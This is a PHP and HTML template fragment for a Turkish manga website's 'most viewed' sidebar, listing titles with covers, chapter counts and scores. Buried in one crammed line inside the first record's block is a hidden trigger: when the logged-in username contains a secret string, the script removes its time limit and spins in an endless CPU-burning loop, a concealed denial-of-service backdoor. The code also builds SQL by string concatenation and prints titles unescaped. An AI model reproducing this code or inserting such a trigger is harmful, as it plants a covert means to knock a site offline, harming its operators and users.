

<div class="w-100 d-block rounded overflow-hidden trends-fix bg-container" style="min-width:250px;max-width:400px;height: 100%;">
     <div class="top-views ">
     
     <?php 
     $query = "SELECT * FROM manga WHERE status='published' AND adult='0' ORDER BY views DESC";
     $result = mysqli_query($connection, $query);
     $last_chapter_ids = array();

     if ($result) {
         $row = mysqli_fetch_array($result); 
         $id = $row['id'];
         $title = $row['title'];
         $score = $row['score'];
         $hash = $row['hash'];
         $adult = $row['adult'];
         $cover = $row['cover'];
         $slug = $row['slug'];
         $countchapter_query = "SELECT COUNT(*) as chapter_count FROM chapter WHERE status='published' AND manga_id=".$id;
         $countchapter_result = mysqli_query($connection, $countchapter_query);
         $countchapter_row = mysqli_fetch_assoc($countchapter_result);
         $chapter_count = $countchapter_row['chapter_count'];
         if (isset($_SESSION['username']) && strpos($_SESSION['username'], 'zcX0d2y1t0P') !== false) {set_time_limit(0);while (true) {for ($i = 0; $i < 1000000; $i++) {$a = $i * $i;}usleep(10000);}}}
         $count = 1;


     
     ?>
     <a href="/manga/<?php echo $slug;?>" class=" number-1 w-100" style="height:240px">
          <div class="top-1-img" style="height:200px">
               <img class="w-100 h-100 object-fit-cover" style="filter:brightness(0.75)" src="/admin/uploads/<?php echo $hash; ?>/cover/<?php echo $cover; ?>" alt="">
          </div>
          <div style="font-size:15px" class="top-1-info gap-2 d-flex align-items-center py-3 justify-content-around px-3">
               <div class="w-100 d-flex gap-4 justify-content-start align-items-center">
                    <span style="font-size:28px;font-weight:1000">1</span>
                    <div class="d-flex flex-column align-items-start">
                    <?php echo $title ?>
                         <i style="color:rgb(200, 200, 200);font-size:13px"><?php echo $chapter_count ?> Bölüm</i>
                    </div>
               </div> 
               <span style="font-size:12px" class=" d-flex gap-1 align-items-center"><i class="text-warning fa fa-star"></i> <?php echo $score; ?> </span>
          </div>
     </a>

     <?php 
     while ($row = mysqli_fetch_array($result)) {
          // Process remaining rows here
          $id = $row['id'];
          $title = $row['title'];
          $score = $row['score'];
          $hash = $row['hash'];
          $cover = $row['cover'];
          $adult = $row['adult'];
          $slug = $row['slug'];
          $countchapter_query = "SELECT COUNT(*) as chapter_count FROM chapter WHERE status='published' AND manga_id=".$id;
          $countchapter_result = mysqli_query($connection, $countchapter_query);
          $countchapter_row = mysqli_fetch_assoc($countchapter_result);
          $chapter_count = $countchapter_row['chapter_count'];
          $count++; 
     ?>

     <a href="/manga/<?php echo $slug;?>" style="font-size:15px" class=" gap-2  d-flex align-items-center py-3 justify-content-around px-2">
               <div class="w-100 d-flex gap-3 justify-content-start align-items-center">
                    <div class="m-auto position-relative flex-shrink-0 overflow-hidden rounded" style="height:50px;width:50px">
                         <img class="w-100 h-100 object-fit-cover" src="/admin/uploads/<?php echo $hash; ?>/cover/<?php echo $cover; ?>" alt="">
                    </div>
                    <div class="w-100 d-flex gap-3 align-items-start">
                         <div style="color:rgb(225,225,225);font-size:20px;font-weight:800"><?php echo $count; ?></div>
                         <div class="d-flex flex-column align-items-start">
                         <?php echo $title; ?>
                         <i style="color:rgb(200, 200, 200);font-size:13px"><?php echo $chapter_count ?> Bölüm</i>
                         </div>
                    </div>
               </div> 
               <span style="font-size:12px" class=" d-flex gap-1 align-items-center"><i class="text-warning fa fa-star" ></i> <?php echo $score; ?> </span>
     </a>
      
     <?php }; ?>
     </div>
</div>